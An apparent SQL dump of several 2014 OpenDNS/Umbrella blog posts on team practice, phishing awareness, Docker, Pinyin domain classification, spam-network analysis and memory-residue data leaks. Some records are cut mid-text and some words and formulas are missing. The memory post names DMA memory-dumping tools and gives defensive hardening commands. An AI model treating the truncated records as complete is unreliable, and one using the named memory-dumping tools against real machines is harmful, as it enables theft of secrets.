We had our ups and downs when it came to estimating the amount of time to finish specific technical tasks, and the occasional miscommunication, but what team hasn’t?\nCould we do better? Could we become more efficient? We wanted to answer these questions, and upon beginning the process of answering them we also, unknowingly, began a process that was an exercise in transparency.\nThe Team\nThe team is comprised of myself, an engineering manager, plus a product manager and six engineers. We are neither the largest nor smallest team at OpenDNS, but we are one of the more varied in backgrounds and abilities. Two of our engineers reside in Vancouver, working at our other awesome office, while the rest of the team is here in San Francisco. This separation has always made for challenging communication; Google Hangouts sometimes doesn’t work and finding quiet places to talk at either office can be impossible. Even with these known difficulties we decided to add a whole new layer to the mix – ” programming” (more on that later).\n\nTraining: Agreements\n“Agile” has been a rather contentious term over the past 10 years and has come to mean different things to different teams. To succeed we knew the team needed to get to a common understanding. We brought in a specialist from Industrial Logic to help us. He walked us through the various Agile methodologies and concepts, and even had us build mock engineering projects using Agile methodologies. The training was eye-opening for a lot of us.\nThe key element to the success of our training was something called “team agreements”. Team agreements are a set of guidelines produced by the team that help the team come to a shared sense of behavior and responsibility. An example of an agreement might be, “We agree to be fully present during meetings.” “Fully present” might mean different things to different teams, but for us, it means that our phones and computers are put away and we’re all participating in the conversation.\nAny team member can propose new agreements or propose amendments to existing agreements at any time, and once an agreement is accepted it is up to the team members to uphold the agreement. These aren’t rules or mandates but simply a way of saying that “this is the way we want to work together.” It is important that every member of the team fully support each agreement or they simply won’t work.\nWe like to post our agreements in a place that both the team and other members of the organization can see any time they walk past. Our initial team agreements:\nPair programming is highly encouraged, but not required: we believe that having more than one person working on a problem reduces the number of bugs and increases the overall quality of the code\nUnpaired code follows a code review process, which is tightly coupled with Github: Enterprise:\n\nCreate a pull request in Github\nFind at least one person to review the pull request and get feedback from them\nMake revisions based on feedback\nMerge pull request into the master Git branch\n\n\nCode deployments to customers are okay Monday – Thursday until 4pm; outside of those hours only bug fixes are to be deployed to customers\nBe fully present during meetings\nTo tell you the truth these agreements are our third revision since coming out of Agile training. Our original agreements were a bit too focused on already established Agile practices, and we didn’t think they were adding any real value to the team. We decided the agreements you see here would be a great revision to the original, and so far they have worked pretty well for us.', 'Culture;Security Engineering', 'https://umbrella.cisco.com/blog/2014/11/12/agile-team-agreements/');

I noticed that I had a few alerts from my bank. Cool. What couldn’t wait until morning, bank? Well, it turns out that someone that wasn’t me had overdrawn my account at an American Eagle Outfitters somewhere in Iowa.\n“We would like you to authorize these charges. Did you spend $300 at American Eagle in Iowa?”\nNo, I most certainly did not.\nI couldn’t believe it. Not because of where they were spending the money or even the amount of it, but the fact that I had spent the previous 3 years reviewing false positive requests for PhishTank, which is a collaborative clearing house, owned and operated by OpenDNS, for data and information about phishing on the internet. I felt like I had full knowledge of all the maneuvers and deceptions that phishers try to fool you with, but apparently I was wrong. They had caught me with my guard down, and got me so good that I couldn’t even recall when or where it happened.\n\nNext stop, Bummerstown.\nPhishes, if you are unaware, are fake websites that are designed to look real for the purpose of stealing your personal information. One of the most common examples would be an email that was presumably from a bank, demanding that you log into the site for one reason or another (either to update your security settings, to review recent charges on your account, etc.) A link will generally be provided for “convenience” which often redirects you to a site that looks just like the log-in page of a legitimate company.\nIf I had just followed my own advice, I would have saved myself several days’ worth of time and hassling with my finances. Hopefully you learn from my mistakes and follow these few simple guidelines when handling your own personal, sensitive information on the Internet:\nAlways check the url/sender of the email\nIf a website is asking for a password or any type of personal information about yourself, you should double-check the url or sender of the email to make sure it’s actually who you think it is. Look closely for typos which, believe it or not, are a very strong indicator that you’re dealing with a phish. You also want to make sure that url doesn’t have any sneaky subdomains that are designed to look like the website you’re attempting to visit. For instance, you want it to be google.com, and not something like google.imxds.co.il.\n\nThink twice when presented with scare tactics\nA common way that phishers try to catch you slippin’ is to make you assume that you’re on the clock. If you’re just trying to give a bank info ASAP so that they don’t lock your account, you’re probably less likely to check to see if it’s legitimate or not. Don’t fall for this trap. It’s good practice to take a step back and analyze the situation, especially before revealing any sensitive information about yourself.\nChange your passwords regularly\nThis sort of goes without saying. You should also make sure that you choose a strong, complex password to provide yourself with better protection from things like “Brute-Force” attacks, and all things similar. Make sure it’s not something that can be found in the dictionary, contains special characters and numbers (if this is an option), contains upper and lowercase letters, is a minimum length of 10 characters and cannot be guessed easily based on user information (birthdate, postal code, phone number, etc.) Using a password manager is probably also a good idea, as is enabling “2-step authentication” wherever available.\nUtilize Free Internet Tools\nThere are many great tools on the internet that give you the ability to check the suspiciousness of a site. PhishTank.com is a great example of one. If the link seems “phishy,” head on over to PhishTank and run it through the search engine, at which point you’ll be presented with valuable information about the site that you searched for, including whether or not the community believes the site to be legitimate or not.\n\nThese tips seem small, but weaving them into your daily life might save you a good amount of time in the future. You should probably also upgrade your network/internet security if you haven’t already. OpenDNS is a pretty great solution. You can also take the OpenDNS Phishing Quiz and see how good you are at determining the difference between an actual phish and a legitimate company site.', 'Security Research;Threat Discovery', 'https://umbrella.cisco.com/blog/2014/11/12/one-phish-two-phish-red-phish-account-details-just-got-stolen/');

In meeting with our partners, I’ve seen many approaches to this problem in other solutions, from libraries of config files that are painful to manage, to checklists and even well-documented standard operating procedures (SOP) documents for manual processes. All of these approaches work… technically. However, you need a better way of defining security settings and managing them in long term if you want to be truly efficient, and profitable.\nTo solve this problem, we built Centralized Settings — a new feature, designed with our MSP partners in mind and created with their direct input at every stage of development. Partners wanted an efficient way to manage customer settings in groups and as repeatable processes. They also highlighted that while they focus on defining standardized deployments, they occasionally need to set up a one-off customer in an efficient manner. They also wanted to be able to reuse customizations, but without the headaches associated with traditional configuration or template file approaches. Centralized Settings accommodates all of these use cases, and more.\nThese new features allow you to create multiple settings and apply them to some, many or all of your customers. Since the settings are truly linked, any future changes to a setting are instantly applied to every customer using that setting. You can also set up a default policy, so that when you onboard a new customer they’ll automatically be set up with your custom tailored settings from day one — without any additional work.\nWe made sure that Centralized Settings not only saves time, but is also flexible enough to cover the needs of fast-growing and efficient MSPs. A key to this flexiblility is the ability to define multiple settings as your own standards and apply them to specific customers. Here are some example use cases where having multiple standard settings can speed your deployments and decrease the time you spend managing customer accounts:\nCreate vertical specific content filtering categories: a doctor’s office will have different needs than a law firm or school.\nBrand the service with your MSP logo and support information on the block page and then apply those changes to all customers. Need to change a phone number or update the logo? No problem! This change now takes seconds and is instantly applied to all customers.\nReuse standardized settings, even when customizations are needed. Even if a customer needs highly customized content filtering settings, you can create that setting as a one-off while still using your standardized security setting and block page appearance.\nWith Centralized Settings from OpenDNS, managing security for your customers becomes easier, quicker and more scalable. Bringing on a new customer now takes only seconds — including all the customizations that are part of your process. With an easy setup and intuitive workflow, there’s no need to waste time on additional training about configuration files or manage an over-complicated system.  Why spend excess time and resources managing one-off settings for each individual customer? By managing standards instead, you’ll keep customers happy and improve your bottom line.', 'Announcements;Blog;MSP', 'https://umbrella.cisco.com/blog/2014/11/06/announcing-centralized-settings-new-feature-umbrella-msps/');

During the conference, I first presented “Sweeping the IP space: the hunt for evil on the Internet” on Sep 24th, and then co-presented “Design to discover: security analytics with 3D visualization engine” on Sep 26th with Thibault Reuille.\n\nWe enjoyed several very good technical talks at the conference as well as numerous discussions with speakers and attendees. Such events can be a good opportunity to forge partnerships for the exchange of data and shared intelligence. Kudos to Virus Bulletin and our friend Martijn and his crew for the neat organization.\nA good number of talks are available on Virus Bulletin’s website and several of them caught our interest, of which we mention a few below:\nIn “DNSSEC: how far have we come?” Nick Sullivan gives a summary of the state of the art in DNSSEC deployment and implementation on the Internet.\nIn “Hiding the network behind the network. Botnet proxy business model” Cristina Vatamanu presented her very insightful work about dissecting a proxy network that is rented to botnet owners for C&C communication with colleagues Alexandru Maximciuc and Razvan Benchea. A key element in this network model is that it has at least two levels of proxies protecting the real C&C servers, with proxy level 1 being responsible for redirecting the DNS traffic (on UDP port 53) and HTTP traffic (on port 80) to a backend central DNS server and proxy level 2 respectively. This proxy network has notably been used by Citadel and Cryptolocker. We have covered a different fast flux proxy network from a DNS and IP perspective in [1][2] but the talk by Cristina and co. comes as a excellent complementary behind-the-scenes look at one such network.\nIn “Can we trust a trustee? An in-depth look into the digitally signed malware industry”, Adrian Stefan Popescu and Gheorghe Jescu presented an analysis of different methods for using a certificate to digitally sign malware files, using either a stolen certificate originally issued to a trusted IT company, or certificates that are issued for certain developers who use them with malicious intent. They also described cases of the same abused certificates used by not only one but several malware families.\nI also enjoyed “P0wned by a barcode: stealing money from offline users” where Fabio Assolini described Boleto, a very popular and easy payment method in Brazil. Since early 2013 Boleto has been the target of malware writers who developed trojans programmed to change boletos locally when they are generated by the computer or browser. With this forgery, the user unknowingly ends up submitting the payments to the cybercriminals’ accounts.\nFinally, “OPSEC for security researchers” by Vicente Diaz and Dani Creus was also quite an interesting talk as it described fundamentals, tips and tricks of Operational Security for researchers. I’d like to share this quote from the talk: “[t]he golden rule in Operational Security is silence as a defensive discipline. If you don’t really need to say something, then don’t. If you do need to talk to someone, do it in a secure way where you don’t compromise the content of your message and, if possible, don’t generate metadata on the communication”. There were more good talks we liked at Virus Bulletin but unfortunately we cannot cover all of them.\nBefore coming back to the city, I also took the opportunity to visit Seattle and enjoy a hike to Mount Rainier with a couple local friends – which was fabulous, as you can see here.\n\nShortly after the conference Thibault and I were invited by our friend Morton Swimmer from TrendMicro to give a talk at the company’s Forward-looking Threat Research (FTR) team’s meeting down in Cupertino, CA. We presented the talk “Visualization of IP and DNS data” on Oct 15th in which we shared some relevant use cases of combining DNS and IP space investigation with visualization to detect Internet threats.\nThe event also featured other guest speakers from Twitter and Facebook and we spent the rest of the day having valuable discussions with several “Trenders”.

Given the recent spike in widespread vulnerabilities (Heartbleed, Shellshock, etc.), applying updates and patches in a timely fashion is more critical than ever, whether for your OS or any other applications. Quantifying the impact of these disclosures in easy-to-understand language will help convince users to take action, but if they aren’t swayed by the severity of vulnerabilities, you may want to push updates and patches yourself.\nGive users straightforward, easy to understand rules. For example: don’t click on unfamiliar links:\nTechnology can be overwhelming—even for experienced users. Combine that with natural stress from the office and it’s easy to see how even astute workers may not always remember every rule, for example, not sharing confidential information via office chat clients. Keep IT rules straight to the point and bite-sized so that people can easily remember them. If you need a starting point, try our ten point list of top tips for users to stay safe online.\nHelp them help you:\nKnowledge is power and by arming your users to fight against threats on their own, you’ll make your life a lot easier. Taking steps such as making sure two-factor authentication is enabled, or a password manager is installed can make a huge difference. Also, train your users to seek answers on their own by running suspicious URLs through VirusTotal, or questioning the legitimacy of attachments. These are basic practices that they can easily learn. You may want to develop training specific to your environment to make sure your users are equipped to deal with the most common infection vectors they might encounter, for example, focusing on attachments as a finance firm.\nChange the channel, not the message:\nNot everyone reads emails from IT on a regular basis. For some, information might not sink in unless they see it in a powerpoint, or hear it straight from you. As an IT professional, there are several ways you can get your message across, whether that’s in-person training, email digests, or one-on-one tutorial sessions. You may even want to work in a practical exercise with something like phishme, to prove that these threats are very real, and sometimes difficult to spot.\nIt’s not always the easiest thing to do, but by making sure your message is getting through by any means necessary, you’re creating a culture of security awareness that will benefit your organization for years to come.\nAssume the worst, hope for the best:\nEven by following these tips, the reality is that your security is only as strong as the weakest link, which in most cases is probably your users. So while you can maintain a positive outlook on the effects of patching, update and education, realize that you are still vulnerable, and prepare for the worst.\nYou can do this by building a multi-faceted security program with several layers of protection (one such layer being Umbrella by OpenDNS). No one solution is a silver bullet, so having multiple layers of protection is key.\nPracticing good security is mostly about awareness, and people want to do the right thing. Unfortunately, human nature dictates that that doesn’t always happen, but if you’re prepared, you can mitigate the damage if a situation does occur.', 'Blog;Security 101;Umbrella', 'https://umbrella.cisco.com/blog/2014/10/27/5-tips-help-admins-protect-users-national-cyber-security-month/');

Quadra relies heavily on Docker for application deployment. Last night at OpenLate, OpenDNS Infrastructure Engineer Jessica Gadling presented a talk and demo of our progress so far.\nBelow is a quick summary of Jessica’s talk.\n\nDocker at OpenDNS  from OpenDNS\nMotivations\nAt OpenDNS we have many engineering teams working on a range of products and internal services. We take pride in the fact that engineers can choose tools and technologies that best meet their needs. We also have a number of environments (dev, staging, production) across our own dedicated infrastructure and Amazon’s AWS. This can make dependency management difficult when sharing compute resources.\nWhy Docker?\nWe chose to Docker (http://docker.io) as a central component in our PaaS. Containerization makes software packaging and deployment simple by bundling applications with their dependencies and isolating both from unrelated applications. Virtualization was another option, but efficiently utilizing shared resources and the management overhead can become costly. We’re able to deploy hundreds of instances to individual hosts easily with low overhead.\nQuadra\nWe’ve provided our engineers with a CLI tool to work with Quadra. This is a simple and human-friendly interface that gives our engineers enough power and control to build and deploy applications directly or from a CI tool such as Jenkins.\nBase images are provided for common dependencies. We’ve also created pre-baked load balancers that can talk to the PaaS and keep proxy configurations up to date, so new projects can be up and running quickly.\nBehind the scenes Quadra takes care of scheduling application instances to appropriate hosts based upon host utilization. Routing traffic to Quadra instances is fully automated by our software based routing layer.\nFuture\nImprovements and features added to Docker are quickly incorporated into our PaaS. It’s an exciting time to be working with this technology. We look forward to talking in more detail about Docker and the rest of Quadra!\nAbout OpenLate\nOpenLate is biweekly meetup at OpenDNS offices featuring technical talks and hack time.

INSERT INTO `opendns` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (1472, 'Machine Learning in Security Part 1: Language Model Detection in Domains', 'Jeremiah O\'Connor', 'October 16, 2014', 'At OpenDNS our resolvers are flooded with massive amounts of Chinese domains on a daily basis, many of which security researchers are unfamiliar with. One of the projects our team was initially tasked with was to come up with a method to filter these Chinese domains out from the rest of the traffic in order to reduce the false positive rate for our classifier algorithms and to potentially detect IPs exhibiting spamming or search engine optimization (SEO) behavior. Pinyin is the official phonetic system for transcribing Mandarin pronunciations into the Latin alphabet; it is one of the ways to represent Mandarin or Cantonese on the Internet, specifically in DNS.\nIn certain cases it is very hard to detect Chinese or Pinyin domains, and most language identification tools are unable to solve this problem effectively. In order to tackle this problem we used the “bag of words” approach, and also used machine learning techniques such as N-gram modeling and Naive Bayes Probability to build an algorithm to classify these domains as Pinyin.\nPinyin, or Hanyu Pinyin, is the official phonetic system for transcribing the Mandarin pronunciations of Chinese characters into the Latin alphabet in the People’s Republic of China, Republic of China (Taiwan), and Singapore. More information about Pinyin can be found on Wikipedia.\nParallels can be drawn between programmatic language detection and the way a human would recognize a language. Before describing the algorithm we designed, let’s discuss a scenario that will build intuition about how language detection algorithms work. Imagine you are walking down the street and there is a person walking in front of you talking on a cell phone in a different language. From the first few phrases out of that person’s mouth, you begin to recognize the language but are not exactly sure what it is.\nAt what point are you certain about what language the person is speaking? In theory, the way a human recognizes language is the exact same way you would program a machine to do it. For example, saying “how are you?” in Spanish is “como estas?”, but in Portuguese it’s “como vai” and in French it is “comment ca va?”. Since the first word in each phrase sounds the same, you wouldn’t be able to really discern the difference until you hear the next word. This is very similar to the way a computer processes languages: it will have to identify the words character by character, breaking down prefixes, suffixes, and words and match them to its own “memory bank” (corpus).\n\nBackground/Problem:\nN-gram modeling is a machine learning technique widely used for natural language processing—some examples include spelling correction and searching. Most recently, it has become popular in building security incident detection and monitoring systems. The reason it’s called N-gram is that the algorithm works on N sized character blocks; a 1-token sequence would be a unigram, 2-token sequence, bigram, and an n-token sequence, an n-gram. Typically, when doing language classification, you are classifying a text (documents, webpage, book, article, etc.), and you are training your algorithm on multiple texts written in a specific language that are usually very long in length (e.g. Moby Dick, Paradise Lost, etc.).\nIdentifying the language of a specific domain presents a harder problem to solve, because it’s much shorter in length than having a whole document full of characters of a certain language. Relating it back to the cell-phone example above; if you were only able to hear a 10 words out of the conversation it would be much harder to accurately identify the language than if you heard 200 words. Also,  domains are written in a sort of “Internet Language”, and often contain a lot of numbers, so another thing to take into account was to craft our own version of Pinyin, which is Pinyin text from articles/books combined with domain names.\n\nCorpus Generation:\nOne of the most crucial aspects of building classifier algorithms is coming up with a solid corpus to train your function on. A corpus is essentially the algorithm’s past experience with the language, and the training stage is where you teach your algorithm that language. It would be a similar comparison to the cell-phone example above. Say that the reason you are able to recognize the language is because you spent a few years in a foreign country. You may be able recognize different dialects, and be able to discern between Spanish as spoken in Spain from Spanish spoken in Latin America, or the differences between Brazilian Portuguese and European Portuguese. Since this was not the traditional method of language detection, we had to define our own language model, a combination of Pinyin domains and Pinyin language found in books or articles written in Pinyin to add as a supplement.\nAs part of this research we have 3 different types of corpora:\n-Plain Pinyin text (this was a great resource: http://en.wikibooks.org/wiki/Category:Pinyin)\n-Known Pinyin Domains\n-Chinese Language Domains not necessarily Pinyin (mostly comprised of domains with a lot of numbers)\nIt is very important when building your corpus to craft it very precisely, and not allow for any deviations from what you’re trying to identify. We had to search far and wide on the web for Pinyin texts. Luckily, many of my classmates are from China, or are Chinese-Americans, and were able to direct me to some great resources. Currently we have 3 corpora. One is just a text corpus which is what we might train on for language classifiers. The other was more of an Internet language corpus comprising of Chinese domains. The only problem is some of the Chinese/Pinyin domains just comprise of numbers. The third is a specialized corpus of Chinese domains that consist mostly of numbers, and very few alphabetical characters (ex. 58493.com.cn).\n\nAdditional Feature Detection:\nWe added some supplemental feature-detection on top of our classifier to improve the total score for domains where the language is harder to identify. These features were based off geo-location “hints” extracted from the DNS log data. Here is where we took into account certain features the domain exhibited, for example: .cn in the TLD, or if the country the IP of the domain resolved to the countries China, Hong Kong, or Taiwan. I used PyGeoIP/MaxMind library to do the country lookups. In addition, I also filtered out puny code domains for future analysis, where the SLD start with “xn—“.\nAnother feature I am starting to design is what I call “giveaway” words, for example, “zhuong”, “xiang”, “zheng” etc. These substrings carry a higher weight and are more unique to Pinyin than other languages, increasing the probability that the domain is Pinyin. The intuition here (going back to the cellphone example), these would be words or sounds you would hear in the conversation when as soon as you heard them, you would instantly recognize the language. Usually they’re very unique to the language, not many other languages would have “zhang”, “xiong”, etc. Scanning through domains for additional words will effect performance, a better alternative would be to assign higher weights to certain trigrams and bigrams. This will require a more in depth analysis of the Pinyin language and the way it’s constructed.\n\nBuilding the Classifier:\nStep 1: Cleaning the data\nOne of the first things to do when building a text classifier algorithm is to “clean” the data as best as possible. Traditionally we would be working with large texts and, in the preprocessing stage, we would first filter out “stop words” (ex. the, a, than, etc.). Since we are working with domain data, we decided to treat the TLDs as “stop words” and filter those out, as well as all the periods (“.”) for classification. Depending on what type of Chinese domains we are looking for we can strip out the numbers and the dashes. We then break up the domain into bigrams, trigrams, and quad grams and add those into separate dictionaries. Most of the algorithm’s text analysis will be done on the SLD (second-level domain) and the other subdomains attached to that. We then go through and divide.\nStep 2: Calculating the probabilities\nThe next step is to go through and check the if the bigram, trigram, quad gram exists within the corpora. The following calculations are then employed to compute the probabilities for all the grams:\n\nAs you can see from the formulas above, the quad grams have a higher weight, being multiplied by 3, trigrams are multiplied by 2, and no weight attached to bigrams. This make sense because the longer the string, especially if it’s more unique, the higher the probability it is a part of a specific language.\nStep 3: Adding in features calculating total score\nFinally, we went through and summed up all of the probabilities of the all the grams, per domain, and factored in the scores for the additional features to compute the total score per

the algorithm was successful in being able to identify Pinyin domains in our DNS query traffic. For testing, we ran the filter continuously on traffic samples from our resolvers and were able to come back with successful results. In addition, we used the cosine distance algorithm to test the accuracy of the algorithm. When testing against a few different domain corpuses (French, English, Spanish, Russian, German), the Pinyin one came back with the closest match. Overall this helped the Security Research team sift through domains faster – and in some cases be able to identify new malicious Chinese domains. Some additional features we’d like to add include improving smoothing (for grams with 0 probability) and weighting (features, and possibly grams). We also want to try and detect different types of anomalies that deviate from the norm, for example, Pinyin language in a domain that ends in .eu.\nSome future ideas for this project would be to expand the corpora to support multiple languages in addition to Pinyin. As a part of this research we have decided to publish the code for the Pinyin Language Detector on our public GitHub page at https://github.com/opendns/PinyinDetector.', 'Open Source;Security Research', 'https://umbrella.cisco.com/blog/2014/10/16/detecting-pinyin-domains/');

Economists predict email spam costs American businesses and consumers approximately $20 billion annually, with spammers making a return of approximately $200 million per year [Rao, Reiley]. Rao and Reiley also note that spam provides nefarious individuals with one of the cheapest returns on investment as the production of spam is incredibly cheap.\nToday’s blog post investigates a spam network and identifies behavioral patterns that could be useful for further research. Spam is interesting because it can be highly networked activity that requires coordination between multiple end computers distributed throughout the globe.\n\nThe Spam Run\nIn late August, the OpenDNS Security Labs team noticed an unusual surge in DNS queries for a mail server. The figure below shows the rate of DNS queries/min over the span of 24 hours. Visual inspection indicates that a definite surge occurred towards the end of the day. The steepness in the slope for queries/min made us suspicious about the reason behind the spike. For comparison, we created a DNS query/min graph for the previous day to get an idea of more baseline query requests. The second graph shows that traffic follows an expected diurnal cycle with traffic easing off in the early morning and evening.\n\n\nQuery spikes are a good first predicator for suspicious behavior but do not usually provide enough evidence to label behavior as malicious. Therefore, to get a better picture of the attack we captured 68 IPs that had an unusually high query rate and mapped them geographically. The image below shows their geographic distribution:\n\nThe IPs had a wide geographic distribution with a small cluster in Ukraine. Furthermore, each of these IPs belonged to networks belonging to residential ISP providers. This new information validated our initial suspicions that the uptick in the queries had come from a spam run. It was now time to investigate the nature and scope of the spam run.\n\nThe Network\nTo get a better picture of the spam network, we ran a query which collected all of the DNS queries made by the 68 suspicious IPs for the current and past day. These logs were then filtered down to contain only MX records and A records for mail servers. With structured data, we needed to use a data structure which would highlight the interconnections between the different agents.\nStructuring the data as a bipartite graph between IPs to mail servers/domains serves as an easy way to understand the data. A bipartite graph is a graph composed of two independent sets. It allows us to easily calculate which IPs contact the same or similar mail servers. The figure below is a example of the spam network, consisting of 1000 mail servers and six suspected spam IPs. Mail servers are the blue nodes, and IPs are red nodes. Each of the IPs have a cluster of mail servers that only they contact and a few mail servers that are contacted by the whole group. The same structure exists for the larger version of the graph (68 IPs, 40k domains, and 281k edges).\n\nAnalyzing the type of mail servers contacted reveals an interesting hierarchy. The most frequently contacted mail servers were servers belonging to large, well-known mail providers such as Yahoo, Google, and AOL. A second tier followed which consisted mainly of academic institutions. This was followed a mid-tier of various proxy websites. Finally, at the bottom was a set of low-profile websites. Low profile websites contacted by suspicious IPs had two features in common—they all received sporadic traffic (sub 500 queries per day) and were located in the same geographic zone as the IP sending them email. These low profile websites represent the nodes with degree one in the graph.\nWith such geographic variance amongst the IPs, it comes as no surprise that domains residing in 19 different country TLDs received spam. The .jp TLD received the most queries with ~800k.\nNow that we had a better idea of how the IPs were structured in relation to the domains, we wanted to understand how they might be possibly sending mail or communicating with one another. To do this, we went back to the bipartite graph and did some edge analysis, looking for domains that lay in the ‘sweet spot’ of degree counts. We knew that nodes that were talking to a high percentage of the 68 IPs might be in some way connected to the general spam network.\n\nResults\nThis general technique led us to identify four domains of interest. The first was the periodic request to an IP in Mexico. Some further investigation on this IP led to some interesting results: this IP served as the mail server for a set of Russian hosted domains. This itself was suspicious—a domain hosted in Russia, relying on a mail server located in Mexico. Also suspicious was the fact that this mail server was associated with a set of constantly changing domain names and IPs. In the span of one month there were a total of 3 IP changes and 10 domain name changes. Below is a graph showing the querying frequency of this domain over the course of the day:\n\nOnly five of the 68 IPs did not make attempts to contact this dial-up IP during the course of the day. We suspect this IP is used as a email forwarder or open-relay for the spam campaign.\nFrom the remaining three suspicious domains, two shared similar structure with the IP in Mexico (multiple domain names associated with changing IP addresses). The last domain was a mail server misconfigured so it could serve as an open relay.\n\nConclusion\nSpam is interesting because it often serves as the vector of infection for botnets or banking trojans. The majority of websites targeted by spam were small e-commerce businesses. It would not be surprising if these spam campaigns target small e-commerce websites with promises of boosting their SEO positions—e-commerce operators unknowingly click on the possibly fraudulent SEO link and become compromised. Therefore, a point of further research is to determine how many of these websites targeted by spam become either compromised websites or part of a botnet. This type of analysis can be useful in developing models that predict relationships between receiving spam and possible future infected domains or users.', 'Big Data;Security Research;Threat Discovery', 'https://umbrella.cisco.com/blog/2014/10/14/identifying-behavioral-patterns-spam-network/');
INSERT INTO `opendns` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (1474, 'From an MSP Service Desk to Helping Other MSPs Secure Their Clients', 'Alex Ianchici', 'October 10, 2014', 'At OpenDNS, we take our partnership with MSPs very seriously as we continue to build our MSP-focused team across account management, engineering and customer success. I joined OpenDNS as a technical resource to work directly with our MSP partners as they deploy and manage Umbrella for MSPs. I also work with the big RMM tools to build easier deployment scripts, and act as a solutions architect when our partners have more interesting environments.\nPersonally, I come from the MSP world and spent 6 years working for MSPs of different sizes. Having been on the other side, I understand the need to automate as much as possible—whether it’s deploying a product or monitoring it to ensure the product is running as expected, automation and standardization are vital to your business. Now that I’m on the vendor side, it’s extremely rewarding to be able to help fellow MSPs improve efficiencies. My role here at OpenDNS is to provide support for automating deployment of our product using your tools, as well as providing feedback from the partner voice to our engineers and product team for product enhancements which will help you standardize our products across your customer base.\nMSPs have two critical relationships when it comes to running their business – customers, and vendors. Your customers are your lifeblood, and MSPs rightfully focus significant energy on building and maintaining the customer relationship.  However, in the past world of on-prem hardware and boxed software, vendors were largely out of the picture, except for the occasional marketing blurb or promo email. When I was working for an MSP, I rarely got sales engineering services from the big software companies, so my vendor relationships were usually with distributors for purchasing.\nEnter “the cloud”—technology to make your life easier with less hardware to manage, allowing you to “do more with less.” However, moving pieces of your managed service to a cloud provider means trusting that vendor with service delivery. This requires a higher level of trust, and means that having a technical relationship with that vendor is much more important.\nMSPs must be able to trust that their vendors will not only perform, but also that they understand your needs, pain points and objectives. Most importantly, they need to truly understand the managed services business and how you serve your customers. You require that the vendor respect the line between vendor-MSP and MSP-customer relationships. You expect that your vendor understands that you can’t just interrupt your customer in the middle of the day to test a fix and that you can’t just walk over to the computer. (After all, you bought an RMM tool to do that!)

In this blog post, we are going to review some common sources of leaks that are frequently overlooked, even by security professionals.\nIn-memory data\nAlthough there is currently a lot of research to mitigate this, sensitive data typically has to be stored unencrypted in memory in order to be processed.\nIs credit card information safe if it only resides in RAM?\nAs demonstrated by point-of-sale malware such as Dexter and Alina, it is certainly not. These strains of malware do not attempt to inspect the network traffic, where the information is encrypted—instead, they  constantly scrape the memory of compromised systems in order to find and exfiltrate the data after it has been decrypted by the system.\nAccessing the memory doesn’t even require a machine to be compromised by a piece malware. By design, the Firewire and Thunderbolt interfaces found on many modern laptops and workstations provide direct access to the main memory.\nTools such as Winlockpwn and more recently Inception make it trivial for anyone to dump the memory of a live system using these interfaces…and the attack will likely go unnoticed.\nTherefore, sensitive data should be present in memory for the shortest possible amount of time. In particular, plaintext passwords stored in memory should be overwritten with garbage right after having been hashed for storage or verification. The same recommendation applies to web applications processing user-submitted forms.\nWhile this shrinks the time window in which data can be exfiltrated, it is not a silver bullet and has to be done at application-level.\nOS-level mitigation\nThe Inception web site mentions a few ways to stay safe against Firewire/Thunderbolt DMA attacks:\nWindows: block the SBP-2 driver and remove the Firewire drivers if they are not required\n\n\nOSX: set a firmware password\n\n\nLinux: remove the 1394 drivers\nIn-memory data persistence\nOperating systems usually do not clear the memory pages used by an application after it exits. They just mark them as “available for reuse” and erase the previous content only when they actually have to be reused by a different application.\nAs a result, passwords used to encrypt files, passwords used for certificate requests, or passwords used to connect to file servers or to get an interactive shell on a remote machine can remain accessible in memory long after the action was done.\nIf a system becomes compromised, live data can be recorded—but a fact frequently overlooked is that sensitive data used in the past may also be present and get exfiltrated. Does your system have a 2+ years uptime? Congratulations. But can you remember everything you did on this system for the past 2 years?\nOS-level mitigation\nGrsecurity is an extensive security enhancement to the Linux kernel that defends against a wide range of security threats.\nIn particular, Grsecurity can wipe all the memory pages used by a process as soon as the process exits. In order to do so, the PAX_MEMORY_SANITIZE option has to be enabled.\nData swapped out to disk\nLinux swap partitions (or files), Windows paging files and OSX paging files are used to optimize the amount of available physical memory by temporarily storing less-used memory pages to disk, and copying them back to RAM as needed.\nFor this reason, an unsuspected copy of a top-secret document that was carefully stored only to a USB stick can be present, and remain accessible for a very long time. Web browsers, password managers, file encryption apps, and VPN clients can all be susceptible to having a copy of the in-memory data they use stored to disk, and quitting these apps doesn’t have any effect on what is stored in the paging files.\nModern systems also provide the ability to hibernate (“suspend-to-disk”): before powering off the computer, a copy of the memory is stored to disk. When the computer is powered on again, the system can be brought back to the exact state it was in before being powered off.\nThis incredibly useful feature also means that sensitive data present in memory will be stored to disk, and will remain accessible until the system goes to hibernation mode again. Swap and hibernation files/partitions can be encrypted. However, this doesn’t help against attacks on a live system, since the encryption keys are in memory.\nOther unexpected copies of the memory are also commonly written to disk. In particular, when a process crashes on a UNIX system, a “core” file can be automatically created by the system for post-mortem analysis. This file includes a copy of all the in-memory data used by the process before the crash. Some operating systems provide ways for applications to avoid this behavior for memory pages containing sensitive data.\nFor example, the Linux kernel introduced the MADV_DONTDUMP advice for the madvise() system call. However, one cannot reasonably expect all the applications to properly use this mechanism, or for this mechanism to be available at all.\nSystem crashes also happen, and in order to help developers and vendors diagnose and fix the root cause of the crashes, it is common for kernels to dump a full copy of the memory to disk before rebooting. As expected, these dumps can contain sensitive data, and the files can remain available forever if not manually deleted.\nThe Volatility framework makes it easy to analyze most of these dumps, and malware can take advantage of these dumps the same way.\nOS-level mitigations\nOSX\nHibernation and paging files are encrypted by default since OSX Lion (10.7).\nThis can be checked by entering the command:\nsysctl -n vm.swapusage\nPaging can also be totally disabled by removing or renaming the /System/Library/LaunchDaemons/com.apple.dynamic_pager.plist file.\nWindows\nEncrypt paging files\n1) Open a Command Prompt with Administrator privileges\n2) Type: fsutil behavior set encryptpagingfile 1\n3) Reboot the system.\n\n\n…or disable paging files\n1) Navigate to the Control Panel and click System\n2) Select Advanced System Settings\n3) In the Advanced tab under the Performance section, click Settings\n4) In the Advanced Tab under Virtual Memory section, click Change\n5) Untick Automatically manage paging file size for all drives\n6) Select each drive listed and select the No paging file radio button\nfor each.\n\n\nDisable kernel crash dumps\n1) Navigate to the Control Panel and click System\n2) Select Advanced System Settings\n3) In the Advanced tab under the Startup and Recovery section, click Settings\n4) Under the System Failure section, change the Write debugging information drop down to (none).\n\n\nDisable hibernation/suspend-to-RAM\n1) Open a Command Prompt with Administrator privileges\n2) Type powercfg -h 